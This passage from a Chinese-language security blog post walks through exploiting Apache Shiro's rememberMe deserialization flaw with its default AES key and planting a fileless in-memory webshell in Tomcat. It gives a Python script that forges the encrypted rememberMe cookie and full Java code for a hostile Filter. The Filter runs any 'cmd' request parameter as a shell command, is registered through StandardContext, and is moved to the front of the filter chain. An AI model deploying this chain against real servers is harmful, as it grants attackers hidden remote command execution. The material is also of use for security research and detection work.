src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031350495-638d7dcd-83f0-4861-b90e-7c2bc647b1f3.png" alt="image.png"><br>这里在全局找一下哪里调用了<code>setDecryptionCipherKey</code>,<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey</code><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031442683-519d226e-042e-4967-9379-b2e5f39239cb.png" alt="image.png"><br>再全局找哪里调用了<code>setCipherKey</code><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031558886-46ba1f9c-cfd8-4a48-b768-82c38edeb435.png" alt="image.png"><br><code>_DEFAULT_CIPHER_KEY_BYTES_</code>正是aes加密的key<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031586449-65be49de-e98c-4b1d-b629-6e42198b119b.png" alt="image.png"><br>再回到<code>cipherService.decrypt</code><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032019157-29a86dfe-8f23-4631-8938-39ba46f0ee8f.png" alt="image.png" style="zoom:50%;"><br>这里取了前16个字节作为iv，并且将去掉前16字节后的数据进行解密，所以这里的iv也是可控的。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032252167-d82abef7-fd24-4db1-8640-66214136d092.png" alt="image.png"><br>后续就是将解密后java序列化数据一路return。<br>回到<code>convertBytesToPrincipals</code>函数中，一串<code>deserialize</code>函数，最后发现了<code>readObject()</code><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032334531-bbdcfea9-bac8-471c-9845-e5e81f9c9f98.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032363698-fd536023-dfb4-4feb-a642-40dc7aaa2df5.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032386770-58e3bf22-7378-4799-905d-570c037ba6cf.png" alt="image.png"><br>这里解密的过程就清楚了。<br>base64-&gt;AES(iv为为密文的前16位，key为”kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;“，加密方式为<code>AES/CBC/PKCS5Padding</code>)-&gt;反序列化<br><a name="AQgBH"></a></p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">payload</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(base64.b64decode(payload))</span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload1=<span class="string">&quot;&quot;</span>    </span><br><span class="line">    payload=encode_rememberme(payload1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
<p><a name="LRlhg"></a></p>
<h1 id="Tomcat内存webshell"><a href="#Tomcat内存webshell" class="headerlink" title="Tomcat内存webshell"></a>Tomcat内存webshell</h1><p>tomcat中内存webshell的原理就是通过动态注册的方式，添加Filter或者Servlet，利用处理请求时的<code>doFilter()</code>或者<code>service()</code>,操作request和response，到达无文件落地的webshell。<br>写内存webshell大致就两步<br>1.获取tomcat上下文对象<br>2.通过上下文对象动态注册Filter或Servlet<br><a name="gHhMw"></a></p>
<h2 id="获取上下文对象"><a href="#获取上下文对象" class="headerlink" title="获取上下文对象"></a>获取上下文对象</h2><p>通过这几篇文章，<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">基于Tomcat无文件Webshell研究</a> ，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a>，<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>大概总结了下大佬们的方法，思路大致都是通过分析tomcat中处理request，response的执行栈，找到哪些对象中将request和response作为属性存储了起来，利用反射或其他方法获取到该对象，进而获取到request和response。</p>
<ol>
<li>利用<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code></li>
</ol>
<p><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636036019217-07cd508a-653b-476f-b646-597c56400b1d.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636036123443-193de81c-3755-4f26-b79e-54db39f19248.png" alt="image.png"><br>该类将request和response存进了ThreadLocal，通过反射修改<code>WRAP_SAME_OBJECT</code>为<code>true</code>，初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>，可以在之后的请求中通过他们获得<code>request</code>和<code>response</code>。<br>但是在<code>lastServicedRequest.set(request)</code>之前，已经执行了<code>filter.doFilter(request, response, this);</code>,并且rememberMe功能就是ShiroFilter的一个模块，所以在反序列化时不能获取到request，在shiro反序列化中是行不通的。</p>
<ol start="2">
<li><code>Thread.currentThread.getContextClassLoader()</code></li>
</ol>
<p>参考这这篇文章 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>，他这里分析的比较长，一直获取到了request对象，主要是用来进行回显的，如果是用来写内存马的话，没有那么复杂，不需要获取到request，只要获取到<code>StandardContext</code>就够了。<br>简单看一下<code>Thread.currentThread.getContextClassLoader()</code>获取到的内容。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636038384514-b3ebbcdf-0f55-4afd-920c-2e2c389eb578.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636038430731-334b9ce3-7191-4891-b3f4-2c60acac33ef.png" alt="image.png"><br>获取到了<code>StandardContext</code>的子类<code>TomcatEmbeddedContext</code>。</p>
<ol start="3">
<li>通过Mbean获取</li>
</ol>
<p>没有复现成功<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7535#toc-2">tomcat不出网回显连续剧第六集</a></p>
<ol start="4">
<li>通过Spring框架</li>
</ol>
<p><a name="ryUkK"></a></p>
<h2 id="注册Filter"><a href="#注册Filter" class="headerlink" title="注册Filter"></a>注册Filter</h2><p><a name="azTeZ"></a></p>
<h3 id="通过StandardContext"><a href="#通过StandardContext" class="headerlink" title="通过StandardContext"></a>通过StandardContext</h3><p>创建一个恶意filer,重写<code>doFilter()</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Filter filter=<span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().write(output);</span><br><span class="line">                    servletResponse.getWriter().flush();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
<p>通过<code>Thread.currentThread.getContextClassLoader()</code>获取到StandarContext对象。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636122259117-198b9ac3-4d93-48c0-86b5-835b2da05fab.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
<p>分析一下Filter调用的流程<br>查看执行栈中第一个<code>ApplicationFilterChain</code>的上一条<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636183059973-212d3b91-487d-4269-80e2-0cd33aa77c56.png" alt="image.png"><br><code>filterChain</code>的初始化，调用了的<code>ApplicationFilterChain</code>的<code>createFilterChain</code>函数<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636183153434-ada3e457-6c38-40a4-b7c7-52763b4bbf5f.png" alt="image.png"><br>看一下关键部分的代码<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636183302383-dab5bde6-3145-4c3e-9572-04aece45d65e.png" alt="image.png"><br>从<code>StandardContext</code>中取出FilterMaps，根据FilterMaps与请求的url的匹配情况，再从<code>StandardContext</code>中取出对应的<code>FilterConfig</code>调用<code>addFilter</code>添加到<code>FilterChain</code>中。<br>从这里就可以看出来，如果要添加Filter，需要在<code>StandardContext</code>中操作<code>FilterConfigs</code>和<code>FilterMaps</code></p>
<p>接下来添加<code>FilterMap</code>和<code>Filterconfig</code>到<code>StandardContext</code>中主要依赖这三个方法：<br><code>org.apache.catalina.core.StandardContext#addFilterDef</code><br><code>org.apache.catalina.core.StandardContext#addFilterMap</code><br><code> org.apache.catalina.core.StandardContext#filterStart</code></p>
<p>通过<code>addFilterDef</code>添加<code>FilterDef</code>到<code>StandardContext</code>，再通过<code>filterStart</code>添加到<code>FilerConfigs</code>中<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636185042452-2bae89b6-b873-4d89-b5a7-2c0926002f77.png" alt="image.png"><br><code>filterStart</code>中先清空<code>FilterConfigs</code>，在遍历<code>FilterDefs</code>,生成<code>FilterConfig</code>添加到<code>FilterConfigs</code>中。<br>具体实现代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">standardCtx.addFilterDef(filterDef);</span><br><span class="line">standardCtx.filterStart();</span><br></pre></td></tr></table></figure>
<p>添加<code>FilterMap</code><br>添加Filter有两个相关的方法：<code>addFilterMap</code>和<code>addFilterMapBefore</code>，其内部分别调用了<code>this.filterMaps.add(filterMap)</code>和<code>this.filterMaps.addBefore(filterMap)</code><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636186653947-fba57549-80d4-4fc5-b05a-b065671304ff.png" alt="image.png"><br>这里其实用哪个影响都不大，<code>addBefor</code>也不能直接插入到首位，而是插入到insertPoint的位置。<br>插入<code>FilterMap</code>的实现代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FilterMap filterMap=<span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">standardCtx.addFilterMap(filterMap);</span><br></pre></td></tr></table></figure>
<p>从前面<code>createFilterChain</code>中的代码可以看到，是通过遍历<code>FilterMaps</code>来将<code>Filter</code>添加到<code>FilterChain</code>中的，并且<code>Filter</code>本身就是通过链式调用的，所以最好是将恶意的<code>Filter</code>插入到最前面，这里就可以通过控制<code>FilterMaps</code>中的顺序来间接控制<code>FilterChain</code>中的顺序。<br>这里实现方法也很简单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取filterMaps</span></span><br><span class="line">FilterMap[] filterMaps=standardCtx.findFilterMaps();</span><br><span class="line">FilterMap[] tmpFilterMaps=<span class="keyword">new</span> <span class="title class_">FilterMap</span>[filterMaps.length];</span><br><span class="line"><span class="comment">//将恶意Filter移到第一位</span></span><br><span class="line"><span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (filterMaps[i].getFilterName()==<span class="string">&quot;yaoa&quot;</span>)&#123;</span><br><span class="line">        tmpFilterMaps[<span class="number">0</span>]=filterMaps[i];</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        tmpFilterMaps[index]=filterMaps[i];</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">    filterMaps[i]=tmpFilterMaps[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636187969962-440923a5-c2e3-4d16-897f-3239c9d779c1.png" alt="image.png"><br>恶意<code>Filter</code>在<code>FilterMaps</code>中的第一位，下图为第二次请求时的filterChain。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636188157687-306e2b02-b259-441d-b15e-51b29780a976.png" alt="image.png"></p>
<p>还有一个就是后面写脚本的时候发现的，如果同一个<code>Filter</code>注册两次，之后的访问都是报错，必须重启tomcat才会恢复正常，所以需要在注册前检查一下是否已经存在了，避免发送两次payload导致tomcat挂了。<br>最后完整的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Filter filter=<span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().write(output);</span><br><span class="line">                    servletResponse.getWriter().flush();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="keyword">if</span>(standardCtx.findFilterDef(<span class="string">&quot;yaoa&quot;</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//添加FilterConfig</span></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            standardCtx.addFilterDef(filterDef);</span><br><span class="line">            standardCtx .filterStart();</span><br><span class="line">            <span class="comment">//添加FilterMap</span></span><br><span class="line">            FilterMap filterMap=<span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">            standardCtx.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取filterMaps</span></span><br><span class="line">            FilterMap[] filterMaps=standardCtx.findFilterMaps();</span><br><span class="line">            FilterMap[] tmpFilterMaps=<span class="keyword">new</span> <span class="title class_">FilterMap</span>[filterMaps.length];</span><br><span class="line">            <span class="comment">//将恶意Filter移到第一位</span></span><br><span class="line">            <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (filterMaps[i].getFilterName()==<span class="string">&quot;yaoa&quot;</span>)&#123;</span><br><span class="line">                    tmpFilterMaps[<span class="number">0</span>]=filterMaps[i];</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    tmpFilterMaps[index]=filterMaps[i];</span><br><span class="line">                    index++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                filterMaps[i]=tmpFilterMaps[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="zuxyL"></a></p>
<h3 id="通过ApplicationContext"><a href="#通过ApplicationContext" class="headerlink" title="通过ApplicationContext"></a>通过ApplicationContext</h3><p>参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbe1c3174d41">动态注册之Servlet+Filter+Listener</a>，这里用的是<code>ServletContext</code>，不过一般情况下可以获取的都是他的子类<code>ApplicationContext</code><br>还是用<code>Thread.currentThread.getContextClassLoader()</code>来获取<code>ApplicationContext</code><br>从上一种方法中得到的<code>StandardContext</code>中就有该对象<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636189425311-c64789d8-f608-41a4-9a20-4520b64911c3.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636189523251-607309f1-e989-48b3-9e20-adc050b3ed2b.png" alt="image.png"><br>但是这里是protected修饰的，需要用反射获取。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">Field applicationContextField=Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">ApplicationContext applicationContext=(ApplicationContext) applicationContextField.get(standardCtx);</span><br></pre></td></tr></table></figure>

<p>正常添加Filter的代码</p>
